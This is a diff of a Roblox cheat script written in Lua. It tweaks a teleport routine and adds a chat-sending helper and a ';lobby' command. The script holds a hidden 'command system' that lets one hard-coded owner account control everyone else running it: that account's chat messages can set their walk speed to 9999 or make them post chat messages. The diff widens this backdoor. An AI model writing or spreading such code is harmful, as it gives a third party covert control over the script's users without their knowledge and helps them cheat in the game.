@@ -1134,14 +1134,13 @@ local function teleportToGround()
     local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 
-
     originalPosition = HumanoidRootPart.Position
 
     local rayOrigin = HumanoidRootPart.Position
     local rayDirection = Vector3.new(0, -1000, 0)
 
     local raycastParams = RaycastParams.new()
-    raycastParams.FilterDescendantsInstances = {Character} 
+    raycastParams.FilterDescendantsInstances = {Character}
     raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
     raycastParams.IgnoreWater = true
 
@@ -1151,12 +1150,12 @@ local function teleportToGround()
         local groundPosition = raycastResult.Position
         HumanoidRootPart.CFrame = CFrame.new(groundPosition + Vector3.new(0, 3, 0))
 
-
-        wait(0.2) 
-        HumanoidRootPart.CFrame = CFrame.new(originalPosition)
+        wait(0.2)
+        
+        HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart.Position.X, originalPosition.Y, HumanoidRootPart.Position.Z)
     else
-		countdownValue = 0.6
-		updateCountdownUI(countdownValue)
+        countdownValue = 0.6
+        updateCountdownUI(countdownValue)
     end
 end
 
@@ -3280,6 +3279,15 @@ Uninject = Gui.NewButton({
 	end,
 })
 
+function newChat(msg)
+	local args = {
+		[1] = msg,
+		[2] = "All"
+	}
+	game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+end
+
+
 --- command system by GODCLUTCHER
 
 local Owner = "top_Coco2332"
@@ -3314,6 +3322,11 @@ task.spawn(function()
 					task.spawn(function()
 						if Message:lower() == ";speed" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 							LocalPlayer.Character.Humanoid.WalkSpeed = 9999
+						end
+					end)
+					task.spawn(function()
+						if Message:lower() == ";lobby" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+							newChat("/lobby")
 						end
 					end)
 				end)
